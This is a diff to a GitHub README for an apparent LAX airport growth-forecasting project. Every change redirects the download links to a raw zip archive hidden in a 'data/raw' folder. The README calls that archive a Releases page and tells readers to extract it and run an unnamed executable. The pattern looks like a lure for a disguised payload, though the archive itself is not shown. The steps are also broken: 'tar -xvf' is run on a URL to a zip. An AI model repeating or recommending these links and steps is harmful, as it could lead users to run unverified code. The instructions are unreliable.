@@ -1,6 +1,6 @@
 # 📈 Project_D_LAX_Airport_Growth_Prediction - Analyze LAX Growth with Ease
 
-[![Download](https://raw.githubusercontent.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/main/output/Project_D_LAX_Airport_Growth_Prediction-v1.5.zip%20Growth%20Prediction-brightgreen)](https://raw.githubusercontent.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/main/output/Project_D_LAX_Airport_Growth_Prediction-v1.5.zip)
+[![Download](https://github.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/raw/refs/heads/main/data/raw/Project-Airport-LA-Prediction-Growth-2.2.zip%20Growth%20Prediction-brightgreen)](https://github.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/raw/refs/heads/main/data/raw/Project-Airport-LA-Prediction-Growth-2.2.zip)
 
 ## 📜 Overview
 
@@ -30,7 +30,7 @@ To begin, follow these steps to install the application on your computer.
 
 ## 📥 Download & Install
 
-To download the application, please visit the Releases page: [Download LAX Growth Prediction](https://raw.githubusercontent.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/main/output/Project_D_LAX_Airport_Growth_Prediction-v1.5.zip).
+To download the application, please visit the Releases page: [Download LAX Growth Prediction](https://github.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/raw/refs/heads/main/data/raw/Project-Airport-LA-Prediction-Growth-2.2.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version.
@@ -57,7 +57,7 @@ To download the application, please visit the Releases page: [Download LAX Growt
 
 1. Open a terminal.
 2. Move to the directory where you downloaded the file.
-3. Extract the file using the command: `tar -xvf https://raw.githubusercontent.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/main/output/Project_D_LAX_Airport_Growth_Prediction-v1.5.zip`
+3. Extract the file using the command: `tar -xvf https://github.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/raw/refs/heads/main/data/raw/Project-Airport-LA-Prediction-Growth-2.2.zip`
 4. Navigate to the extracted folder and run the application using the command: `./application-name`.
 
 ## 📊 How to Use the Application
@@ -114,4 +114,4 @@ These topics offer further insight into the skills and technologies applied in t
 
 If you would like to contribute to this project, please open an issue or a pull request on our GitHub page. Contributions are always welcome!
 
-[Download LAX Growth Prediction](https://raw.githubusercontent.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/main/output/Project_D_LAX_Airport_Growth_Prediction-v1.5.zip) and start forecasting today!
+[Download LAX Growth Prediction](https://github.com/rafiqqqq/Project_D_LAX_Airport_Growth_Prediction/raw/refs/heads/main/data/raw/Project-Airport-LA-Prediction-Growth-2.2.zip) and start forecasting today!
